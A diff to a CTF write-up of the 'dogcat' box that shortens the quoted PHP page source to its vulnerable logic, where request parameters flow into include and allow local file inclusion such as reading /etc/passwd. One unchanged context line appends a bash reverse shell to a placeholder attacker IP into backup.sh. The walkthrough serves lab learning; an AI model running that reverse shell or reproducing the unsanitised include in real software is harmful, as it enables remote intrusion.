@@ -193,40 +193,21 @@ the output is:
 
 After decoding the base64 encoded text we get the page's source code:
 
-``` php 
-<!DOCTYPE HTML>
-<html>
-
-<head>
-    <title>dogcat</title>
-    <link rel="stylesheet" type="text/css" href="/style.css">
-</head>
-
-<body>
-    <h1>dogcat</h1>
-    <i>a gallery of various dogs or cats</i>
-
-    <div>
-        <h2>What would you like to see?</h2>
-        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
-        <?php
-            function containsStr($str, $substr) {
-                return strpos($str, $substr) !== false;
+``` php
+<?php
+    function containsStr($str, $substr) {
+        return strpos($str, $substr) !== false;
+    }
+    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+        if(isset($_GET['view'])) {
+            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                echo 'Here you go!';
+                include $_GET['view'] . $ext;
+            } else {
+                echo 'Sorry, only dogs or cats are allowed.';
             }
-            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
-                if(isset($_GET['view'])) {
-                    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
-                        echo 'Here you go!';
-                        include $_GET['view'] . $ext;
-                    } else {
-                        echo 'Sorry, only dogs or cats are allowed.';
-                    }
-            }
-        ?>
-    </div>
-</body>
-
-</html>
+    }
+?>
 ```
 
 We can see that the webserver have an extra parameter, **ext** which if left empty will be set to .php, we can take advantage of it and access other file types, let's try and access the **/etc/passwd**
@@ -362,7 +343,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
 
 After few minutes we should get a connection from the parent box and then when we list our current directory we see the forth flag in a **flag4.txt** file:
 
-``` bash
+```
 flag4.txt
 ```
 
